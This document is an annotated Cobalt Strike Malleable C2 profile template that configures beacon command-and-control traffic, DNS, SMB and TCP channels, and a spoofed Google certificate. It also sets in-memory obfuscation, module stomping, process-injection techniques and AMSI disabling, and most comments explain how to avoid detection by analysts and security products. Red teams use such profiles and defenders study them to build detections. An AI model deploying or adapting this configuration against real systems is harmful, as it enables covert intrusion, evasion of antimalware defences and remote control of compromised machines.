# CobaltStrike 4.0+ Guideline Profile
# 
# Malleable C2 profiles control the beacon traffics and communication indicators as well as in-memory characteristics, beacon process injection
# and influencing post-exploitation jobs, which are the most sexiest features of the CobbaltStrike.
#
# References:
#   * https://www.cobaltstrike.com/help-malleable-c2
#   * https://www.cobaltstrike.com/help-malleable-postex
#
# Author: @bigb0ss
# Github: https://github.com/bigb0sss
#
# Updates:
#   04/02/2020
#   (1) "[]" brackets to contain choice options
#   (2) "<>" brackets for user-supplied values. Example values already provided.
#   (3) Adding options for all the blocks as many as possible. Add/remove them as your own usage. 

### Global Option Block
set sample_name "<bigb0ss>.profile";      # Profile name (used in the Indicators of Compromise report)
set sleeptime "<30000>";                  # Sleep time for the beacon callback (in milliseconds)
set jitter "<50>";                        # Jitter to set %. In this example, the beacon will callback between 15 and 30 sec jitter
set host_stage "[true|false]";            # Staged payload allow or disallow (Note: Stager payloads are generally easier to get caught, but it's necessary for the space-restricted situations)
set useragent "<Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.177>";    # User-Agent Setup

### DNS Beacon Block
set dns_idel "<8.8.8.8>";                 # IP to indicate no tasks available. Avoid using bogon address "0.0.0.0" (This can be picked up as IOC)
set maxdns "[0-255]";                     # Maximum length of hostname when uploading data over DNS (0-255)
set dns_sleep "<1000>";                   # Force a sleep prior to each individual DNS request. (in milliseconds)
set dns_stager_prepend "";                # Prepend text to payload stage delivered to DNS TXT record stager
set dns_stager_subhost "<.stage.8546.>";  # Subdomain used by DNS TXT record stager
set dns_max_txt "[0-255]";                # Maximum length of DNS TXT responses for tasks
set dns_ttl "<1>";                        # TTL for DNS replies

### SMB Beacon Block (P2P)
set pipename "<win_svc+8546>";            # Name of pipe to use for SMB beacon's peer-to-peer communication
set pipename_stager "<win_svc+8546>";     # Name of pipe to use for SMB beacon's named pipe stager

### TCP Beacon Block (P2P)
set tcp_port "<1337>";                    # TCP beacon listen port

### Self-Signed Certificate HTTPS Beacon Block (This is useful to replicate existing SSL certificate values)
https-certificate {
    set C "<US>";                         # Country
    set CN "<google.com>";                # Common Name; Whatever.com or your callback domain  
    set L "<Mountain View>";              # Locality
    set O "<Alphabet Inc.>";              # Organization Name
    set OU "<Google Certificate>";        # Organizational Unit Name
    set ST "<CA>";                        # State
    set validity "<365>";                 # Number of days certificate is valid for
}

### Valid SSL Certificate HTTPS Beacon Block (Specify a Java Keystore file and a password for the keystore)
https-certificate {
    set keystore "<domain>.store";        # Private key, root cert, intermediate cert and domain cert - Java Keystore file should be in the same folder with Malleable C2 profile
    set password "<mypassword>";          # The password to your Java Keystore
}

### Creating a Valid SSL Certificate
# keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store
# keytool -certreq -keyalg RSA -file domain.csr -keystore domain.store
# keytool -import -trustcacerts -alias FILE -file FILE.crt -keystore domain.store
# keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.store

### Code Signing Certificate Block
code-signer {
    set keystore "<keystore>.jks";
    set password "<mypassword>";
    set alias "<server>";
}

### Creating a Code Signing Certificate
# keytool -genkey -alias server -keyalg RSA -keysize 2048 -keystore keystore.jks
# keytool -certreq -alias server -file csr.csr -keystore keystore.jks
# keytool -import -trustcacerts -alias server -file domain.p7b -keystore keystore.jks

### HTTP/S Global Response Header Block
http-config {
    set headers "Server, Content-Type, Cache-Control, Connection, X-Powered-By";        # HTTP header order
    header "Server" "Microsoft-IIS/8.5";
    header "Content-Type" "text/html;charset=UTF-8";
    header "Cache-Control" "max-age=1";
    header "Connection" "keep-alive";
    header "X-Powered-By" "ASP.NET";
    set trust_x_forwarded_for "[true|false]";           # "true" if the team server is behind an HTTP redirector
}

### HTTP-GET Block (Beacon check-in for task queued)
http-get {
    set uri "</image/xxxxxx>";              # For multiple URIs = "/image /index /sexy"
    set verb "[GET|POST]"                   # Not really need to config this for http-get, but you can change it to POST if you want

    client {
        header "Host" "<domain.com>";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
    }

    metadata {
        # Data Transform Language
        base64;                             # Base64 Encode
        base64url;                          # URL-safe Base64 Encode
        mask;                               # XOR mask w/ random key
        netbios;                            # NetBIOS Encode 'a'
        netbiosu;                           # NetBIOS Encode 'A'
        prepend "<user=>";                  # Prepend "string"
        append "<.asp>";                    # Append "string"

        # Termination Statements
        parameter "<key>";                  # Store data in a URI parameter
        header "<Cookie>";                  # Store data in an HTTP header
        uri-append;                         # Append to URI
        print;                              # Send data as transaction body (set "verb" to POST to use "print")
    }

    server {
        # headers will be pulled from the http-config block, or manually add your preferences below:
        header "Server" "Apache";

        output {
            base64;                         # Base64 Encode
            base64url;                      # URL-safe Base64 Encode
            mask;                           # XOR mask w/ random key
            netbios;                        # NetBIOS Encode 'a'
            netbiosu;                       # NetBIOS Encode 'A'
            prepend "<user=>";              # Prepend "string"
            append "<.asp>";                # Append "string"
            print;                          # Server block MUST be terminated with "print"
        }
    }
}

### HTTP-POST Block (Beacon check-in for task output)
http-post {
    set uri "</image/xxxxxx>";              # For multiple URIs = "/image /index /sexy"
    set verb "[GET|POST]"                   # Use "GET" for GET Only C2

    client {
        header "Host" "<domain.com>";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";

        id {                                    
            base64;                         # Base64 Encode
            base64url;                      # URL-safe Base64 Encode
            mask;                           # XOR mask w/ random key
            netbios;                        # NetBIOS Encode 'a'
            netbiosu;                       # NetBIOS Encode 'A'
            prepend "<user=>";              # Prepend "string"
            append "<.asp>";                # Append "string"
            parameter "<id>";               # Add Beacon ID in parameter
            header "<ID-Header>";           # Add Beacon ID in header
        }

        output {
            base64;                         # Base64 Encode
            base64url;                      # URL-safe Base64 Encode
            mask;                           # XOR mask w/ random key
            netbios;                        # NetBIOS Encode 'a'
            netbiosu;                       # NetBIOS Encode 'A'
            prepend "<user=>";              # Prepend "string"
            append "<.asp>";                # Append "string"
            parameter "<key>";              # Store data in a URI parameter
            header "<Cookie>";              # Store data in an HTTP header
            uri-append;                     # Append to URI
        }
    }

    server {
        # headers will be pulled from the http-config block, or manually add your preferences below:
        header "Server" "Apache";

        output {
            base64;                         # Base64 Encode
            base64url;                      # URL-safe Base64 Encode
            mask;                           # XOR mask w/ random key
            netbios;                        # NetBIOS Encode 'a'
            netbiosu;                       # NetBIOS Encode 'A'
            prepend "<user=>";              # Prepend "string"
            append "<.asp>";                # Append "string"
            print;                          # Server block MUST be terminated with "print"
        }
    }
}

### HTTP-Stager Block (Options for using a staged payload)
http-stager {
    set uri_x86 "</get32.gif>";             # Set to download 32-bit payload stage
    set uri_x64 "</get64.gif>";             # Set to download 64-bit payload stage

    client {                                # Clinet = Defining the client side of the HTTP transaction.
        header "Host" "<domain.com>";
        header "Accept" "*/*";
        header "Accept-Language" "en-US";
        header "Connection" "close";
        header "Cookie" "XXXXXX"
        parameter "id" "8645";
    }

    server {
        # headers will be pulled from the http-config block, or manually add your preferences below:
        header "Server" "Apache";

        output {
            base64;                         # Base64 Encode
            base64url;                      # URL-safe Base64 Encode
            mask;                           # XOR mask w/ random key
            netbios;                        # NetBIOS Encode 'a'
            netbiosu;                       # NetBIOS Encode 'A'
            prepend "<user=>";              # Prepend "string"
            append "<.asp>";                # Append "string"
            print;                          # Server block MUST be terminated with "print"
        }
    }
}

### Malleable PE & In-Memory Evasion and Obfuscation Block
stage {
    set checksum "<0>";                             # The CheckSum value in Beacon's PE header
    set cleanup "[true|false]";                     # If "true," free memory associated with the Reflective DLL package when it's no longer needed
    set compile_time "<02 April 2020 02:35:00>";    # The build time in Beacon's PE header
    set entry_point "<92145>";                      # The EntryPoint value in Beacon's PE header
    set image_size_x86 "<512000>";                  # SizeOfImage value in x86 Beacon's PE header ([!] Avoid using image_size_x86 if module_x86 in use)
    set image_size_x64 "<512000>";                  # SizeOfImage value in x64 Beacon's PE header ([!] Avoid using image_size_x64 if module_x64 in use)
    # Module Stomping (By default, Beacon's loader allocates memory with VirtualAlloc. Module stomping is an alternative to this.)
    set module_x86 "<legit.dll>";                   # Ask the x86 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc
    set module_x64 "<legit.dll>";                   # Ask the x64 ReflectiveLoader to load the specified library and overwrite its space instead of allocating memory with VirtualAlloc
    set name "<legit.dll>";                         # The Exported name of the Beacon DLL
    set rich_header "<\x00\x00\x00\x00>";           # Meta-information inserted by the compiler. The Rich header is a PE section that serves as a fingerprint of a Windows’ executable’s build environment
    # Example Rich Header of cmd.exe
    # \x44\x61\x6E\x53\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x78\x93\x00\x42\x00\x00\x00
    # \x73\x62\x03\x01\x03\x00\x00\x00\x73\x62\x04\x01\x15\x00\x00\x00\x00\x00\x01\x00\x25\x01\x00\x00
    # \x73\x62\x01\x01\x05\x00\x00\x00\x73\x62\x05\x01\x09\x00\x00\x00\x73\x62\x0E\x01\x28\x00\x00\x00
    # \x73\x62\xFF\x00\x01\x00\x00\x00\x73\x62\x02\x01\x01\x00\x00\x00\x52\x69\x63\x68\x98\x79\x8F\x1E
    # \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
    set sleep_mask "[true|false]";                  # Obfuscate Beacon, in-memory, prior to sleeping
    set stomppe "[true|false]";                     # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after it loads Beacon payload
                                                        # stomppe [true] - Lightly obfuscate your Beacon DLL
                                                        # stomppe [false] - Allow easy detection
    set obfuscate "[true|false]";                   # Obfuscate the Reflective DLL's import table (can be IOC), overwrite unused header content, and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers
                                                    # "obfuscate" takes many steps to obfuscate your Beacon stage and the final state of the DLL in memory    
    set userwx "[true|false]";                      # Ask ReflectiveLoader to use or avoid RWX permissions for Beacon DLL in memory (can be IOC)
                                                        # userwx [true] - Allow RWX permissions (may bring more attention from analysts and security products)
                                                        # userwx [false] - Ask Beacon's loader to avoid RWX permissions

    # Transform blocks pad and transform Beacon's Reflective DLL stage. (prepend, append, strrep)
    # Make sure that prepended data is valid code for the stage's architecture (x86, x64). The c2lint program does not have a check for this. 
    transform-x86 {
        prepend "\x90\x90\x90";                     # Inserts a string before Beacon's Reflective DLL --> Defeat analysis on the first few bytes of a memory segment of an injected DLL
        append "\x90\x90\x90";                      # Adds a string after the Beacon Reflective DLL
        strrep "ReflectiveLoader" "";               # Replaces a string within Beacon's Reflective DLL --> Defeat analysis on tool-specific strings
                                                    # If "strrep" isn't enough, set "sleep_mask" to true. This directs Beacon to obfuscate itself in-memory before it goes to sleep. After sleeping, Beacon will de-obfuscate itself to request and process tasks. The SMB and TCP Beacons will obfuscate themselves while waiting for a new connection or waiting for data from their parent session.
    }

    transform-x64 {
        prepend "\x90\x90\x90";                     # Inserts a string before Beacon's Reflective DLL
        append "\x90\x90\x90";                      # Adds a string after the Beacon Reflective DLL
        strrep "ReflectiveLoader" "";               # Replaces a string within Beacon's Reflective DLL
    }

    # Stage block allows to add strings to the .rdata section of Beacon DLL
    data "<whatever string>";                       # Adds a string as-is (ex) "bigb0ss")
    string "<whatever string>";                     # Adds a null-terminated string (ex) {'b','i','g','b','0','s','s','\0'})
    stringw "<whatever string>";                    # Adds a wide (UTF-16LE encoded) string (ex) 0062 0069 0067 0062 0030 0073 0073)
}

### Process Injection Block (Controls injected contenet and process injection behaviors)
process-inject {
    set allocator "[VirtualAllocEx|NtMapViewOfSection]";    # The preferred method to allocate memory in the remote process. 
                                                                # allocator [VirtualAllocEx] - For cross-arch memory allocations
                                                                # allocator [NtMapViewOfSection] - For same-arch process injection
    set min_alloc "<4096>";                                 # Minimum amount of memory to request for injected content
    set startrwx "[true|false]";                            # Use RWX as initial permissions for injected content. Alternative is RW.
    set userwx "[true|false]";                              # Use RWX as final permissions for injected content. Alternative is RX.

    # Transform blocks pad and transform Beacon's Reflective DLL stage. (prepend, append)
    # Make sure that prepended data is valid code for the stage's architecture (x86, x64). The c2lint program does not have a check for this.
    transform-x86 {
        prepend "\x90\x90\x90";                     # Inserts a string before Beacon's Reflective DLL
        append "\x90\x90\x90";                      # Adds a string after the Beacon Reflective DLL
    }

    transform-x64 {
        prepend "\x90\x90\x90";                     # Inserts a string before Beacon's Reflective DLL
        append "\x90\x90\x90";                      # Adds a string after the Beacon Reflective DLL
    }

    # Execute - Determin how to execute the injected code
    execute {
		# CreateThread & CreateRemoteThread Operations:
            # (1) Spawn a suspended thread with the address of another function
            # (2) Update the suspended thread to execute the injected code
            # (3) Finally, resume that thread
            # Use [function] “module!function+0x##” to specify the start address to spoof
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";         # Current process only ([!] Sysmon EventID 8 - a process creates a thread in another process)
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";      # No cross-session ([!] Sysmon EventID 8 - a process creates a thread in another process)
        NtQueueApcThread;                                           # Uses RWX shellcode and "CreateThread" start address. Same-arch injection only
        NtQueueApcThread-s;                                         # "Early Bird" injection technique. Suspended process only
		RtlCreateUserThread;                                        # Risky on XP-era targets. Uses RWX shellcode for x86 -> x64 injection. ([!] Sysmon EventID 8 - a process creates a thread in another process)
        SetThreadContext;                                           # Suspended process only
    }
}

### Post-Exploitation Block (Controls the post-ex content and behaviors)
    # CobaltStrike Post-Ex Operations (ex) screenshot, keylogger, hashdump, etc.):
        # (1) Leverage Windows DLLs to execute post-ex features
        # (2) To do this, CobaltStrike spawns a temp process --> injects the feature into it
post-ex {
	set spawnto_x86 "%windir%\\syswow64\\<mfpmp>.exe";              # Do not specify %windir%\system32 or c:\windows\system32 directly
	set spawnto_x64 "%windir%\\sysnative\\<mfpmp>.exe";             # Do not specify %windir%\system32 or c:\windows\system32 directly
	set obfuscate "[true|false]";                                   # Obfuscate the permissions and content of our post-ex DLLs
	set smartinject "[true|false]";                                 # Directs Beacon to embed key function pointers (ex) GetProcAddress, LoadLibrary) into its same-arch post-ex DLLs. 
                                                                    	# This allows post-ex DLLs to bootstrap themselves in a new process without shellcode-like behavior that is detected and mitigated by watching memory accesses to the PEB and kernel32.dll.

	set amsi_disable "[true|false]";                                # Disable AMSI (Antimalware Scan Interface) in powerpick, execute-assembly and psinject before loading .NET or PS code
}
